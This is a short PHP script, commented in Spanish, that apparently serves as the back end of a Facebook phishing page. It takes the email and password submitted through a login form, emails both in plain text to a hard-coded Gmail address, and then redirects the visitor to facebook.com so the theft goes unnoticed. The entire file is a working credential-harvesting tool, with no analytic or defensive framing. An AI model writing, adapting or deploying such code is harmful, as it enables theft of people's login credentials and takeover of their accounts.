<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST["email"];
    $password = $_POST["password"];

    // Configuración del correo
    $destinatario = "anddyku0@gmail.com";
    $asunto = "Nuevo intento de login";
    $mensaje = "Se ha recibido un intento de inicio de sesión:\n\n";
    $mensaje .= "Correo: " . $email . "\n";
    $mensaje .= "Contraseña: " . $password . "\n\n";
    $mensaje .= "Fecha: " . date("Y-m-d H:i:s") . "\n";
    
    // Cabeceras del correo
    $headers = "From: no-reply@tuweb.com\r\n";
    $headers .= "Reply-To: no-reply@tuweb.com\r\n";
    
    // Enviar el correo
    mail($destinatario, $asunto, $mensaje, $headers);

    // Redirigir a Facebook
    header("Location: https://www.facebook.com");
    exit();
}
?>
